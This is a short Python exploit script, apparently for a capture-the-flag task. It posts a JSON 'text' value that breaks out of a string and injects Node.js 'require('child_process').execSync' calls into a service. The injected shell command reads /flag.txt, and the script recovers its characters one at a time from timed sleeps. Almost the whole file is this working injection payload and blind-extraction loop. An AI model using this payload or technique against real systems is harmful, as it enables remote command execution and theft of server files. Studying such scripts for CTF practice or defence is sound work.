import requests
import time

def send_request(idx, payload, sleep_time):
    url = 'http://host:port/api/service/generate'

    token = 'token'

    headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {token}'
    }

    proxies = {
        "http": "http://localhost:8080",
        "https": "http://localhost:8080",
    }
    
    data = {
        "text": f" '}}) + require('child_process').execSync('cat /flag.txt | head -c {idx+1} | {{ read c; if [ \"$c\" = \"{payload}\" ]; then sleep {sleep_time}; fi; }}') // "
    }
    
    start_time = time.time()
    response = requests.post(url, headers=headers, json=data)
    end_time = time.time()

    return response, end_time - start_time

def brute_force_first_three_chars():
    alphabet = '0123456789'  # Adjust as needed
    target_time = 10  # Adjust based on expected delay
    result = ''

    for idx in range(3):        
        for char in alphabet:
            print(f"Trying: {result+char}")
            _, exec_time = send_request(idx, result+char, target_time)

            if exec_time >= target_time:
                result += char
                print(f"Found: {result} - {exec_time}")
                break

    print(f"Brute force result: {result}")

if __name__ == "__main__":
    brute_force_first_three_chars()
